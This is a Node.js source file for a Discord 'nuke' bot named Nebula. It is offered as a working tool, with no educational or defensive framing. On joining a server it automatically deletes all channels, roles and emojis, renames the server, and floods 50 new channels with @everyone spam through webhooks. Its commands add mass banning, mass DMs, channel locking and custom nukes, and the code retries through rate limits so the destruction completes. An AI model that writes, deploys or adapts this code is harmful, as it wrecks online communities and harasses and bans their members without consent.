const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const express = require('express');
const dotenv = require('dotenv');
const fetch = require('node-fetch');
dotenv.config();

// ====== DISCORD BOT SETUP ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildBans,
    GatewayIntentBits.GuildEmojisAndStickers
  ]
});

// ====== WEB SERVER FOR PORT 3000 ======
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => {
  res.send('Nebula Bot is online and auto-nuking servers via webhooks...');
});
app.listen(PORT, () => {
  console.log(`🌐 Web server running on http://localhost:${PORT}`);
});

// ====== RATE LIMIT HANDLER (Exponential Backoff) ======
async function handleRateLimit(promiseFn, maxRetries = 5) {
  let retries = 0;
  while (retries <= maxRetries) {
    try {
      return await promiseFn();
    } catch (error) {
      if (error.code === 429) {
        const retryAfter = (error.retry_after || 1000) * (1.5 ** retries);
        console.warn(`[RATELIMIT] Retrying after ${retryAfter}ms (attempt ${retries + 1}/${maxRetries})`);
        await new Promise(resolve => setTimeout(resolve, retryAfter));
        retries++;
        continue;
      } else {
        console.error(`[ERROR] ${error.message}`);
        return null;
      }
    }
  }
  console.error('[FATAL] Max retries exceeded.');
  return null;
}

// ====== SAFE LEAVE FUNCTION ======
async function safeLeaveGuild(guild) {
  try {
    if (!guild || !guild.available || !guild.members.me) return;
    await handleRateLimit(() => guild.leave());
    console.log('🚪 Successfully left the server.');
  } catch (err) {
    if ([50001, 404, 403].includes(err.code)) {
      console.log('✅ Already left or kicked.');
    } else {
      console.error(`⚠️ Error leaving:`, err.message);
    }
  }
}

client.on('ready', () => {
  console.log(`🚀 Logged in as ${client.user.tag}`);
  client.user.setActivity('discord.gg/migh', { type: 'PLAYING' });
});

// ====== AUTO-NUKE ON JOIN (Customizable) ======
client.on('guildCreate', async (guild) => {
  const BLOCKED_GUILD_ID = '1345474714331643956';
  const spamMessage = '@everyone Nebula\'s return is here discord.gg/migh';
  const channelName = 'neb-was-here';

  if (guild.id === BLOCKED_GUILD_ID) {
    console.log(`🚫 Blocked from nuking guild: ${guild.name}`);
    await safeLeaveGuild(guild);
    return;
  }

  console.log(`🎯 Auto-nuking server: ${guild.name} (${guild.id})`);
  let didSomething = false;
  let totalSent = 0;

  try {
    await new Promise(resolve => setTimeout(resolve, 300));

    // Parallel cleanup
    await Promise.allSettled([
      // Delete Channels
      (async () => {
        const channels = guild.channels.cache.filter(ch => ch.deletable);
        if (channels.size > 0) {
          await Promise.allSettled(channels.map(ch =>
            handleRateLimit(() => ch.delete()).then(() => {
              console.log(`🗑️ Deleted channel: ${ch.name}`);
              didSomething = true;
            }).catch(() => {})
          ));
        }
      })(),

      // Delete Roles
      (async () => {
        const roles = guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed && r.deletable);
        if (roles.size > 0) {
          await Promise.allSettled(roles.map(r =>
            handleRateLimit(() => r.delete()).then(() => {
              console.log(`🗑️ Deleted role: ${r.name}`);
              didSomething = true;
            }).catch(() => {})
          ));
        }
      })(),

      // Delete Emojis
      (async () => {
        const emojis = guild.emojis.cache;
        if (emojis.size > 0) {
          await Promise.allSettled(emojis.map(e =>
            handleRateLimit(() => e.delete()).then(() => {
              console.log(`🗑️ Deleted emoji: ${e.name}`);
              didSomething = true;
            }).catch(() => {})
          ));
        }
      })(),

      // Rename Server
      (async () => {
        await handleRateLimit(() => guild.setName('discord.gg/migh'));
        console.log('📛 Server renamed');
        didSomething = true;
      })()
    ]);

    // Create 50 channels + webhooks + spam
    const totalChannels = 50;
    const MESSAGES_PER_CHANNEL = 20;
    const MAX_MESSAGES = 1000;

    const channelPromises = [];
    for (let i = 0; i < totalChannels; i++) {
      channelPromises.push(
        handleRateLimit(() => guild.channels.create({
          name: `${channelName}-${i + 1}`,
          type: 0
        })).catch(() => null)
      );
      if (i % 10 === 0) await new Promise(r => setTimeout(r, 10));
    }

    const channels = (await Promise.allSettled(channelPromises))
      .map(p => p.status === 'fulfilled' ? p.value : null)
      .filter(ch => ch);

    if (channels.length === 0) return;

    // Create webhooks and spam
    const spamPromises = [];
    for (const channel of channels) {
      const whPromise = handleRateLimit(() => channel.createWebhook({ name: 'neb-was-here' }))
        .then(webhook => {
          for (let i = 0; i < MESSAGES_PER_CHANNEL && totalSent < MAX_MESSAGES; i++) {
            spamPromises.push(
              handleRateLimit(() => webhook.send(spamMessage))
                .then(() => totalSent++)
                .catch(() => {})
            );
          }
        }).catch(() => {
          // Fallback: direct message
          for (let i = 0; i < MESSAGES_PER_CHANNEL && totalSent < MAX_MESSAGES; i++) {
            spamPromises.push(
              handleRateLimit(() => channel.send(spamMessage))
                .then(() => totalSent++)
                .catch(() => {})
            );
          }
        });
      await whPromise;
    }

    await Promise.allSettled(spamPromises);
    if (totalSent >= 500) await safeLeaveGuild(guild);
  } catch (err) {
    console.error('🚨 Auto-nuke failed:', err.message);
    await safeLeaveGuild(guild);
  }
});

// ====== MESSAGE HANDLER (Custom Commands) ======
client.on('messageCreate', async (message) => {
  if (!message.content.startsWith('.') || message.author.bot) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const command = args[0].toLowerCase();
  const BLOCKED_GUILD_ID = '1345474714331643956';

  // Block commands in protected server
  if ((command === 'ba' || command === 'rip' || command.startsWith('set') || command === 'nuke') && message.guild.id === BLOCKED_GUILD_ID) {
    return message.reply('🚫 This command is disabled here.');
  }

  // ===== HELP =====
  if (command === 'help') {
    const embed = new EmbedBuilder()
      .setTitle('🔥 Nebula Bot Commands')
      .setDescription('Unleash chaos with full customization.')
      .addFields(
        { name: '.rip', value: 'Nuke server: delete + spam 50 channels' },
        { name: '.ba', value: 'Ban all members' },
        { name: '.setname <text>', value: 'Rename server' },
        { name: '.seticon <url>', value: 'Change server icon' },
        { name: '.spam <count> <msg>', value: 'Spam messages (max 100)' },
        { name: '.webhookspam <count> <msg>', value: 'Spam via webhook' },
        { name: '.createchannels <count> <name>', value: 'Create multiple channels' },
        { name: '.createwebhooks <count> <name>', value: 'Create channels + webhooks' },
        { name: '.nuke <name> <msg>', value: 'Custom nuke: .nuke hell "FUCK"' },
        { name: '.renamebots <name>', value: 'Rename all bots' },
        { name: '.lock', value: 'Lock all channels' },
        { name: '.massdm <msg>', value: 'DM all members (owner only)' },
        { name: '.servers', value: 'List all servers (owner only)' }
      )
      .setColor('#ff0000')
      .setFooter({ text: 'discord.gg/migh' });

    try {
      await message.author.send({ embeds: [embed] });
      message.reply('📬 Help sent to DMs!');
    } catch {
      message.reply('❌ Enable DMs to see help.');
    }
  }

  // ===== OWNER-ONLY: .servers & .massdm =====
  const OWNER_ID = '1400281740978815118';
  if (command === 'servers' && message.author.id === OWNER_ID) {
    const embed = new EmbedBuilder()
      .setTitle('🌐 Servers')
      .setColor('#00ffff');
    client.guilds.cache.forEach(g => {
      embed.addFields({ name: g.name, value: `ID: ${g.id}` });
    });
    message.author.send({ embeds: [embed] }).catch(() => {});
    message.reply(`✅ In ${client.guilds.cache.size} servers.`);
  }

  if (command === 'massdm' && message.author.id === OWNER_ID) {
    const msg = args.slice(1).join(' ') || 'Default message';
    const members = await message.guild.members.fetch();
    members.forEach(member => {
      if (!member.user.bot) {
        member.send(msg).catch(() => {});
      }
    });
    message.reply('📩 DMs sent.');
  }

  // ===== .setname =====
  if (command === 'setname') {
    const name = args.slice(1).join(' ');
    if (!name) return message.reply('❌ Usage: `.setname My Server`');
    await handleRateLimit(() => message.guild.setName(name));
    message.reply(`✅ Server renamed to \`${name}\``);
  }

  // ===== .seticon =====
  if (command === 'seticon') {
    const url = args[1];
    if (!url) return message.reply('❌ Usage: `.seticon <image_url>`');
    await handleRateLimit(() => message.guild.setIcon(url));
    message.reply('✅ Server icon updated.');
  }

  // ===== .spam =====
  if (command === 'spam') {
    const count = parseInt(args[1]) || 5;
    const msg = args.slice(2).join(' ') || '@everyone CRASHED';
    const amount = Math.min(count, 100);
    for (let i = 0; i < amount; i++) {
      handleRateLimit(() => message.channel.send(msg)).catch(() => {});
      await new Promise(r => setTimeout(r, 50));
    }
    message.reply(`✅ Spammed \`${msg}\` ${amount} times.`);
  }

  // ===== .webhookspam =====
  if (command === 'webhookspam') {
    const count = parseInt(args[1]) || 10;
    const msg = args.slice(2).join(' ') || '@everyone';
    const webhook = await handleRateLimit(() => message.channel.createWebhook({ name: 'crash-webhook' }));
    if (!webhook) return message.reply('❌ Failed to create webhook.');
    for (let i = 0; i < Math.min(count, 50); i++) {
      handleRateLimit(() => webhook.send({ content: msg })).catch(() => {});
    }
    message.reply(`✅ Sent ${count} messages via webhook.`);
  }

  // ===== .createchannels =====
  if (command === 'createchannels') {
    const count = Math.min(parseInt(args[1]) || 10, 50);
    const name = args.slice(2).join('-') || 'crashed';
    for (let i = 0; i < count; i++) {
      handleRateLimit(() => message.guild.channels.create({ name: `${name}-${i + 1}` }));
      await new Promise(r => setTimeout(r, 100));
    }
    message.reply(`✅ Created ${count} channels.`);
  }

  // ===== .createwebhooks =====
  if (command === 'createwebhooks') {
    const count = Math.min(parseInt(args[1]) || 10, 25);
    const name = args.slice(2).join('-') || 'webhook-hell';
    for (let i = 0; i < count; i++) {
      const ch = await handleRateLimit(() => message.guild.channels.create({ name: `${name}-${i + 1}` }));
      if (ch) await handleRateLimit(() => ch.createWebhook({ name: 'payload' }));
    }
    message.reply(`✅ Created ${count} channels with webhooks.`);
  }

  // ===== .nuke (Fully Custom) =====
  if (command === 'nuke') {
    const name = args[1] || 'discord.gg/migh';
    const spam = args.slice(2).join(' ') || '@everyone NUKED';
    const guild = message.guild;

    // Delete all
    await Promise.allSettled([
      ...guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})),
      ...guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete()).catch(() => {})),
      ...guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {}))
    ]);

    await handleRateLimit(() => guild.setName(name));

    // Create 50 channels + spam
    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(() => guild.channels.create({ name: `crash-${i + 1}` }));
      if (ch) channels.push(ch);
    }

    let sent = 0;
    for (const ch of channels) {
      for (let i = 0; i < 20 && sent < 1000; i++) {
        await handleRateLimit(() => ch.send(spam));
        sent++;
      }
    }

    await safeLeaveGuild(guild);
    message.reply(`✅ Nuked with name \`${name}\` and message \`${spam}\``);
  }

  // ===== .renamebots =====
  if (command === 'renamebots') {
    const name = args.slice(1).join(' ') || 'crashed';
    const bots = message.guild.members.cache.filter(m => m.user.bot);
    bots.forEach(bot => {
      if (bot.manageable) {
        handleRateLimit(() => bot.setNickname(name));
      }
    });
    message.reply(`✅ Renamed ${bots.size} bots to \`${name}\``);
  }

  // ===== .lock =====
  if (command === 'lock') {
    message.guild.channels.cache.forEach(ch => {
      handleRateLimit(() => ch.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false }));
    });
    message.reply('🔒 All channels locked.');
  }

  // ===== .ba =====
  if (command === 'ba') {
    const guild = message.guild;
    const ownerID = guild.ownerId;
    const members = await guild.members.fetch();
    const toBan = members.filter(m => m.id !== ownerID && !m.user.bot && m.bannable);

    message.reply(`🔪 Banning ${toBan.size} members...`);
    let count = 0;
    for (const member of toBan.values()) {
      await handleRateLimit(() => guild.members.ban(member, { reason: 'Nebula Mass Ban', deleteMessageSeconds: 604800 }));
      count++;
      if (count % 10 === 0) await new Promise(r => setTimeout(r, 500));
    }
    message.reply(`✅ Banned ${count} members.`);
  }

  // ===== .rip =====
  if (command === 'rip') {
    const guild = message.guild;
    const spam = '@everyone discord.gg/migh';

    await Promise.allSettled([
      ...guild.channels.cache.map(ch => handleRateLimit(() => ch.delete()).catch(() => {})),
      ...guild.roles.cache.filter(r => r.name !== '@everyone' && !r.managed).map(r => handleRateLimit(() => r.delete()).catch(() => {})),
      ...guild.emojis.cache.map(e => handleRateLimit(() => e.delete()).catch(() => {}))
    ]);

    await handleRateLimit(() => guild.setName('discord.gg/migh'));

    const channels = [];
    for (let i = 0; i < 50; i++) {
      const ch = await handleRateLimit(() => guild.channels.create({ name: `neb-${i + 1}` }));
      if (ch) channels.push(ch);
    }

    let sent = 0;
    for (const ch of channels) {
      const wh = await handleRateLimit(() => ch.createWebhook({ name: 'neb' }).catch(() => null));
      if (wh) {
        for (let i = 0; i < 20 && sent < 1000; i++) {
          await handleRateLimit(() => wh.send(spam));
          sent++;
        }
      } else {
        for (let i = 0; i < 10 && sent < 1000; i++) {
          await handleRateLimit(() => ch.send(spam));
          sent++;
        }
      }
    }

    await safeLeaveGuild(guild);
    message.reply(`✅ Nuked. ${sent} messages sent.`);
  }
});

// ====== LOGIN ======
client.login(process.env.TOKEN);
